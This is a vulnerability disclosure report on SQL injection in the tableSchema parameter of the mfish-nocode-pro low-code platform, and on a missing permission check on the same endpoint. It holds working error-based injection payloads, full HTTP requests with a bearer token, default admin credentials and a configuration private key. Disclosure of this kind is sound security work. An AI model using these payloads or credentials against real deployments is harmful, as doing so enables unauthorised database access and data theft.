# mfish-nocode Database Table SQL Injection Vulnerability Report

## Vulnerability Description

mfish-nocode (mfish-nocode-pro, an open-source low-code development platform) in its database connection module: the `/sys/dbConnect/data` endpoint passes the `tableSchema` parameter **unfiltered** into `TableServiceImpl.getDataTable`, where it is concatenated into the MySQL SQL ``select * from `" + tableSchema + "`." + tableName`` → **SQL injection in the SELECT table reference**. Note that the sibling `tableName` parameter IS validated by `verifyTableName` (whitelist regex `^[中文a-zA-Z0-9_.-]+$`, rejecting spaces/special chars), but `tableSchema` has **no validation whatsoever**, so a backtick can close the identifier and inject arbitrary SQL. The endpoint also **lacks the `@RequiresPermissions` annotation** (contrast `/sys/dbConnect/tables` and `/sys/dbConnect/fields`, which have `@RequiresPermissions("sys:database:query")`), so any logged-in user (even without the `sys:database:query` permission) can reach it — a vertical privilege bypass. Since the injected SQL runs inside the query's `SELECT COUNT(0) FROM (...) TMP_COUNT` wrapper, an error-based payload with `extractvalue()` returns data directly in the exception message.

## Affected Versions

mfish-nocode-pro — v1.0.0

## Exploitation Conditions

- Logged-in user (any role) with access to a valid database connection (`sys_db_connect` row); default admin `admin` / `!QAZ2wsx` 

## Reproduction

**0. Precondition — Obtain OAuth2 token and create a DB connection**

```http
POST /oauth2/accessToken HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded

grant_type=password&client_id=system&client_secret=system&username=admin&password=!QAZ2wsx&redirect_uri=http://localhost:8888/oauth2/callback
```

```json
{"code":200,"data":{"access_token":"f9eb3191934644f8a7ef98b5253303a8","expires_in":21600,"refresh_token":"3b322d63c403472290c929575ee6d06c"},"msg":null,"success":true}
```

![image-20260823131219152](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823131219152.b9myis4fj.webp)

Insert a `sys_db_connect` row (DB password must be SM2-encrypted with the private key from `application.yml`: `DBConnect.password.privateKey: 54f0e36b98cf63c3bc6185b61c6e4f2a6e1df3bdeb293a50d7b0bc66881c2419`).

**1. Error-based Injection — Extract Current User**

```http
GET /sys/dbConnect/data?connectId=test-conn-1&tableSchema=movie%60%20UNION%20SELECT%20extractvalue(1,concat(0x7e,user())),2%20--%20&tableName=movie HTTP/1.1
Host: 127.0.0.1:8888
Authorization: Bearer f9eb3191934644f8a7ef98b5253303a8
```

```json
{"code":500,"data":null,"msg":"java.sql.SQLException: XPATH syntax error: '~root@localhost'"}
```

`~root@localhost` = `user()`, echoed in the exception message.

![image-20260823131305909](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823131305909.1ow62k4l51.webp)

**2. Error-based Injection — Database Name**

```
tableSchema=movie` UNION SELECT extractvalue(1,concat(0x7e,database())),2 -- 
→ XPATH syntax error: '~movie'
```

**3. Error-based Injection — Version**

```
tableSchema=movie` UNION SELECT extractvalue(1,concat(0x7e,version())),2 -- 
→ XPATH syntax error: '~8.0.12'
```

Code:

```java
// TableServiceImpl.java:120-131
public MetaDataTable getDataTable(String connectId, String tableSchema, String tableName, ReqPage reqPage) {
    verifyTableName(tableName);  // 仅校验 tableName,这行不校验 tableSchema!
    if (StringUtils.isEmpty(tableSchema)) {
        return query(connectId, "select * from " + tableName, reqPage);
    }
    DataSourceOptions<?> dataSourceOptions = buildDBQuery(connectId);
    if(dataSourceOptions.getDbType() == DBType.mysql){
        return query(dataSourceOptions, "select * from `" + tableSchema + "`." + tableName, reqPage);  // ★ tableSchema 无校验,反引号闭合注入
    }
    return query(dataSourceOptions, "select * from \"" + tableSchema + "\"." + tableName, reqPage);
}

private void verifyTableName(String tableName) {
    // 白名单正则: ^[一-龥a-zA-Z0-9_.\-]+$  只拦截 tableName,不拦截 tableSchema
}
```

![image-20260823131437335](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823131437335.et8w8n1ma.webp)

The injected SQL is also executed by the count query `SELECT COUNT(0) COUNT FROM ( \n [sql] \n ) TMP_COUNT` (which wraps with newlines, leaving the trailing `)` intact), so `extractvalue()` fires during the count pass and the XPATH error is returned in the response message.

```java
// DbConnectController.java:149-181  /data 缺 @RequiresPermissions
@Operation(summary = "获取表数据")
@GetMapping("/data")
// ← 无 @RequiresPermissions("sys:database:query")（对比 /tables、/fields 有）
@DataScope(table = "sys_db_connect", type = DataScopeType.Tenant, excludes = "is_public=1")
public Result<MetaHeaderDataTable> getDataTable(...) { ... }
```

![image-20260823131506870](https://github.com/fangtang7/picx-images-hosting/raw/master/mfish-nocode/image-20260823131506870.2ksni0fan0.webp)
